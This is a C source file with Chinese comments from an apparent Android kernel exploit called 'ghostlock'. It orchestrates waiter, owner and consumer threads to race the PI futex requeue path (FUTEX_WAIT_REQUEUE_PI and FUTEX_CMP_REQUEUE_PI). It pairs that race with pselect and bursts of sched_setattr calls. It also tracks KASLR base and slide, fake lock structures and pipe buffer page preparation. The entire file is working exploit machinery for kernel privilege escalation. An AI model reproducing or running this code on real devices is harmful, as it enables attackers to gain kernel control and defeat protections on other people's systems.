/* route.c — PI futex 路由线程与共享状态
 *
 * 这一组实现 ghostlock 的核心 PI (Priority Inheritance) futex 触发链路：
 *   waiter_thread  — 等待 FUTEX_WAIT_REQUEUE_PI，被 requeue 到 PI 树后跑 pselect
 *   owner_thread   — 持有 PI 锁，触发 PI 链路 walk
 *   consumer_thread— 高速 sched_setattr 消费 waiter，配合 pselect 抢栈帧
 *   run_main_route_threads — 编排三者，等 route_done
 *
 * 共享状态 (f_*, atomic) 同时被 pipe.c 读 (run_main_route_threads +
 * route_done/consumer_calls/consumer_success)，因此全部非 static，
 * 声明在 common.h，定义集中在本文件。
 *
 * kaslr_base/kaslr_slide 也定义在此 (slide.c 写、util.c 读)。 */
#include "unplus.h"

/* P0 trace helper: write a short string to trace file (bypasses stdio fd mess) */
static void p0_trace(const char *msg) {
  int tfd = open("/data/local/tmp/ghostlock_trace", O_WRONLY|O_CREAT|O_APPEND, 0666);
  if (tfd >= 0) { write(tfd, msg, strlen(msg)); close(tfd); }
}

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
uint64_t kaslr_base;
uint64_t kaslr_slide;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  p0_trace("WAITER_BEFORE_REQUEUE\n");
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  p0_trace("WAITER_AFTER_REQUEUE\n");

  do_pselect_fake_lock_route();
  p0_trace("WAITER_AFTER_PSELECT\n");
  atomic_store(&route_done, 1);
  p0_trace("WAITER_ROUTE_DONE\n");

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  p0_trace("WAITER_AFTER_UNLOCK_PI\n");
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
                  "fake_lock=%016zx fake_w0=%016zx\n",
                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  p0_trace("MAIN_THREADS_CREATED\n");

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }
  p0_trace("MAIN_BEFORE_REQUEUE\n");

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  p0_trace("MAIN_AFTER_REQUEUE\n");

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
  p0_trace("MAIN_ROUTE_DONE\n");
}
